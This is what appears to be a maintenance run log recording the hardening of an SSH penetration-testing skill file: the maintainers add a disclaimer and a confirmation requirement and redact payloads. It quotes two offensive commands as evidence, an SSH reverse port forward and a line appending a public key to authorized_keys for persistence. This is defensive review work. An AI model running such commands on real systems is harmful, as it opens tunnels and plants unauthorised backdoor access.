# Run Log: ssh-penetration-testing

- **Selected skill**: `skills/ssh-penetration-testing`
- **Why it was selected**: The skill is high-risk as it includes offensive security tactics like reverse shells, persistence mechanisms, and brute forcing which can be used maliciously without proper safeguards.
- **Risk evidence reviewed**: The `SKILL.md` file contained active payload instructions like `ssh -R 4444:localhost:4444 user@192.168.1.100` and `echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys`, and lacked the mandatory Authorized Use Only disclaimer and agent confirmation requirements.
- **Files changed**: `skills/ssh-penetration-testing/SKILL.md` (Added disclaimer, user confirmation requirement, updated risk to offensive, redacted payloads), `data/maintenance/ledger.json` (Updated tracking entry).
- **Linked PR/issue**: PR-ssh-penetration-testing-hardening
- **Next action**: Monitor for re-introduction of active payloads.